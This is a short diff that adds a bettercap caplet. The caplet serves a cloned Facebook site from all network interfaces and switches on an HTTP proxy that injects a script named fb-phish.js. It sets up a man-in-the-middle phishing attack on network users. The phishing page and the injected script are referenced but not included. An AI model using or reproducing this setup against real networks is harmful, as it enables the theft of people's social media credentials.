@@ -1,0 +1,7 @@
+set http.server.address 0.0.0.0
+set http.server.path caplets/www/www.facebook.com/
+
+set http.proxy.script caplets/fb-phish.js
+
+http.proxy on
+http.server on
